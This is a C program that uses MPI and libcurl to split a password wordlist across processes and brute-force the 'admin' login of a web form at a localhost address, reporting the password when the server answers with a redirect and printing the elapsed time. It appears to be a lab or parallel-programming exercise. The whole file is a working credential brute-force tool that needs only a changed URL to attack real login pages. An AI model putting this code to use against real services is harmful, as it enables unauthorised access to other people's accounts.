#include <mpi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/time.h>


#define MAX_PASSWORD_LEN 100
#define PASSWORDS_COUNT 10000

size_t dummy_write_callback(void *ptr, size_t size, size_t nmemb, void *stream) {
    // Do nothing with the data
    return size * nmemb;
}


void readPasswords(char passwords[][MAX_PASSWORD_LEN], const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("File opening failed");
        exit(1);
    }

    int i = 0;
    while (fgets(passwords[i], MAX_PASSWORD_LEN, file) && i < PASSWORDS_COUNT) {
        size_t len = strcspn(passwords[i], "\r\n");
        passwords[i][len] = 0; // Replace newline or carriage return with null terminator
        i++;
    }

    fclose(file);
}

int main(int argc, char **argv) {
    MPI_Init(&argc, &argv);

    struct timeval start, end;
    double elapsedTime;
    int rank, size;
    MPI_Comm_rank(MPI_COMM_WORLD, &rank);
    MPI_Comm_size(MPI_COMM_WORLD, &size);
    

    int passwords_per_process = PASSWORDS_COUNT / size;
    int passwordFound = 0; // Flag to indicate if the correct password is found
    


    char (*passwords)[MAX_PASSWORD_LEN] = malloc(PASSWORDS_COUNT * MAX_PASSWORD_LEN);
    if (!passwords) {
        perror("Failed to allocate memory for passwords");
        MPI_Finalize();
        return 1;
    }

    char (*recvbuf)[MAX_PASSWORD_LEN] = malloc(passwords_per_process * MAX_PASSWORD_LEN);
    if (!recvbuf) {
        perror("Failed to allocate memory for recvbuf");
        free(passwords);
        MPI_Finalize();
        return 1;
    }

    if (rank == 0) {
        gettimeofday(&start, NULL);
        readPasswords(passwords, "wordlist.txt");
    }

    MPI_Scatter(passwords, passwords_per_process * MAX_PASSWORD_LEN, MPI_CHAR, 
                recvbuf, passwords_per_process * MAX_PASSWORD_LEN, MPI_CHAR, 
                0, MPI_COMM_WORLD);

    CURL *curl;
    CURLcode res;
    long response_code = 0;
    char postfields[MAX_PASSWORD_LEN + 20];

    for (int i = 0; i < passwords_per_process && !passwordFound; i++) {
        curl = curl_easy_init();
        if (curl) {
            sprintf(postfields, "username=admin&password=%s", recvbuf[i]);
            curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:54540/login.php");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, dummy_write_callback);


            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            } else {
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                if (response_code == 302) {
                    printf("Correct password found by process %d: %s\n", rank, recvbuf[i]);
                    passwordFound = 1;
                    break; // Exit the loop if the correct password is found
                }
            }
            curl_easy_reset(curl);
        } else {
            fprintf(stderr, "Failed to initialize curl\n");
        }
        curl_easy_cleanup(curl); 
    }

    MPI_Bcast(&passwordFound, 1, MPI_INT, 0, MPI_COMM_WORLD);


    if (passwordFound) {
        free(passwords);
        free(recvbuf);
        MPI_Finalize();
        return 0;
    }
    

    free(passwords);
    free(recvbuf);

    if (rank == 0) {
        gettimeofday(&end, NULL);
        elapsedTime = (end.tv_sec - start.tv_sec) * 1000.0; // sec to ms
        elapsedTime += (end.tv_usec - start.tv_usec) / 1000.0; // us to ms
        printf("Elapsed Time: %f ms.\n", elapsedTime);
    }


    MPI_Finalize();


    return 0;
}
